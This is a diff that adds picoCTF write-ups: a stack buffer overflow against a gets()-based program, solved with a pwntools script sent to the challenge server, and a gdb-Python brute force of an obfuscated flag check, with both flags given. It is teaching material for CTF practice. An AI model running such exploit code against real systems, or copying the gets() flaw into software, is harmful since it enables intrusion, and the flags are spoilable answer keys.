@@ -425,3 +425,182 @@ r.interactive()
 ```
 
 Flag: **picoCTF{d0ubl3_j30p4rdy_ad77070e}**
+
+## clutter-overflow ![p](https://img.shields.io/badge/Points-150-success) ![c](https://img.shields.io/badge/Binary-darkred)
+
+This is quite an easy challenge, but I'd like to showcase it because it's the first time I actually use the `cyclic` function of pwntools in the way it is supposed to be used.
+
+What we can initially see is this source code:
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+#define SIZE 0x100
+#define GOAL 0xdeadbeef
+
+const char* HEADER = 
+" ______________________________________________________________________\n"
+"|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|\n"
+"| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |\n"
+"|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|\n"
+"| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \\^ ^ |\n"
+"|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \\ ^ _ ^ / |                | \\^ ^|\n"
+"| ^/_\\^ ^ ^ /_________\\^ ^ ^ /_\\ | //  | /_\\ ^| |   ____  ____   | | ^ |\n"
+"|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|\n"
+"| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |\n"
+"|^ ^ ^ ^ ^| /     (   \\ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \\|^ ^|\n"
+".-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |\n"
+"|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\\ |^ ^|\n"
+"| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |\n"
+"|'.____'_^||/!\\@@@@@/!\\|| _'______________.'|==                    =====\n"
+"|\\|______|===============|________________|/|\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
+"\" ||\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"  \n"
+"\"\"''\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
+"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
+"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"";
+
+int main(void)
+{
+  long code = 0;
+  char clutter[SIZE];
+
+  setbuf(stdout, NULL);
+  setbuf(stdin, NULL);
+  setbuf(stderr, NULL);
+ 	
+  puts(HEADER); 
+  puts("My room is so cluttered...");
+  puts("What do you see?");
+
+  gets(clutter);
+
+
+  if (code == GOAL) {
+    printf("code == 0x%llx: how did that happen??\n", GOAL);
+    puts("take a flag for your troubles");
+    system("cat flag.txt");
+  } else {
+    printf("code == 0x%llx\n", code);
+    printf("code != 0x%llx :(\n", GOAL);
+  }
+
+  return 0;
+}
+```
+
+Apart from the beautiful ASCII-art, we can see a dangerous use of `gets(clutter)`: we can overflow the `clutter` buffer in order to overwrite the `code` variable and then gain access to the flag, by writing `0xdeadbeef` in it.  Let's see the protections of the executable with `checksec`:
+```
+[*] '/home/acidburn/Desktop/picoCTF/chall'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+```
+
+Ok so basically nothing, so we can first analyze and exploit in local and then try it on the remote sever. Let's run it with gdb and try to send a cyclic payload, obtained with the command (300 because we want to overflow a 0x100 = 256 size buffer):
+```console
+pwndbg> cyclic 300
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac
+```
+
+We get a Segmentation Fault as expected, but now we need to search for the `code` value (I was initially tricked to work on the `RIP` value as it often happens in binary challenges), that the program outputs us as: `code == 0x6361617263616171`: let's convert that in ASCII ("caarcaaq"). If we then try to search the subpattern we need to submit a 4 byte one, so let's take the first one as example:
+```console
+pwndbg> cyclic -l caar
+1708
+pwndbg> cyclic -l raac
+268
+```
+
+The first result is clearly too big, so we need to cope with little-endian and invert the subpattern, obtaining the index at which it starts, so our offset. Alternatively we can also use the second (inverted) subpattern, getting 264 as result. Thus, 264 is the offset at which the `code` variable starts.
+
+Now we can write a simple script to send `264` = `0x108` (or `0x10c - 0x4`) "A"s and then the required "deadbeef" bytes:
+```python
+from pwn import *
+
+menu_end = "What do you see?\n"
+
+r = remote("mars.picoctf.net", 31890)
+
+offset = 0x10c - 0x4
+payload = b"A"*offset + b"\xef\xbe\xad\xde" 
+
+r.sendlineafter(menu_end, payload)
+
+r.interactive()
+```
+
+Flag: **picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}**
+
+## Easy as GDB ![p](https://img.shields.io/badge/Points-160-success) ![c](https://img.shields.io/badge/Binary-darkred)
+
+By running `file` command we can see the program is stripped, let's open it with `Ghidra` and search for the `entry` function: it calls the `libc_start_main` with parameter `FUN_000109af`, we will rename this as `main` and go on. The main function just gets our input and then performs a check between this and what seems an encoded or encrypted flag, because we can access its characters but they just make no sense.
+
+Take a look at `check_flag` function:
+```c
+undefined4 check_flag(char *param_1,uint param_2)
+
+{
+  char *__dest;
+  char *__dest_00;
+  uint local_18;
+  
+  __dest = (char *)calloc(param_2 + 1,1);
+  strncpy(__dest,param_1,param_2);
+  FUN_000107c2(__dest,param_2,0xffffffff);
+  __dest_00 = (char *)calloc(param_2 + 1,1);
+  strncpy(__dest_00,&DAT_00012008,param_2);
+  FUN_000107c2(__dest_00,param_2,0xffffffff);
+  puts("checking solution...");
+  local_18 = 0;
+  while( true ) {
+    if (param_2 <= local_18) {
+      return 1;
+    }
+    if (__dest[local_18] != __dest_00[local_18]) break;
+    local_18 = local_18 + 1;
+  }
+  return 0xffffffff;
+}
+```
+
+Ok this seems to somehow encode our input and then perform the comparison, returning 1 if all characters are equal: I have no intention of reversing the encoding function, so we can follow the challenge advice and use `gdb` to script that. Also, I never wrote a Python-gdb script, so it's better to learn this.
+
+But first we need to know what to search, so we can run `gdb` first and use `info files` to get the `entry point` address (`0x56555580`), then I executed `x /400i 0x56555580` to print the disassembled instructions because no functions would be recognized. I then searched for functions call or values we already know (like calloc, strncpy or 0xffffffff) and got to `0x5655598e:   cmp   dl,al`, interesting..
+
+If we put a breakpoint at this address and run the program 2 times, once submitting "a" and once "b", we can see that `EAX=0x2e` both times while `EDX=0x3f` first and `EDX=0x3c` then. So we are sure that in EAX we have the encoded flag, and in EDX our encoded input.  Also, if we put picoCTF{} as input we can see that the  `je   0x5655599b <0x5655599b>` instruction right after the `cmp` is taken for the first characters, while is not taken when "A"s start. 
+```python
+# usage:  gdb -x ./easygdb_solve.py -q
+import gdb
+import string
+
+gdb.execute('file ./brute')
+gdb.Breakpoint('*0x5655598e') # set breakpoint address we found
+
+alphabet = string.printable
+flag = ""
+
+for i in range(len(flag), 30):  # 30 is just an upper bound
+    for c in alphabet:
+        open('input.txt', 'w').write(flag + c)  # write on file the input
+        gdb.execute('r < input.txt')            # and submit it
+
+        for _ in range(i + 1):	# skip already checked characters' breakpoint (i+1 because i starts from 0)
+            try:
+                gdb.execute('continue')
+            except gdb.error:
+                pass
+                
+        b_info = gdb.execute('i b', to_string=True)
+        if 'hit {} times'.format(i + 2) in b_info:	# i+2 so we got the new character
+            flag += c
+            print('flag:', flag)
+            gdb.execute('continue')
+            break
+        print('trying:', flag+c)
+
+print(flag)
+gdb.execute('quit')
+```
+
+Flag: **picoCTF{I_5D3_A11DA7_6aa8dd3b}**
